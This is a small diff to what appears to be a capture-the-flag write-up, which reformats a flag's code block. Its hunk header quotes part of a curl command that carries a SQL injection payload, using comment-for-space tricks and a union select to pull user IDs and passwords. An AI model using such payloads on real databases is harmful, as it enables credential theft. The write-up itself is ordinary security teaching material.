@@ -28,4 +28,6 @@ curl -d 'score=92' -d 'ineq=is/**/null/**/union/**/select/**/userid,password,3,4
 
 After concatenating all of the password fields, you get the flag:
 
-```9447{uSerAgenTs_aNd_spaCes_aRe_peasAnt_RacEs}```
+```
+9447{uSerAgenTs_aNd_spaCes_aRe_peasAnt_RacEs}
+```
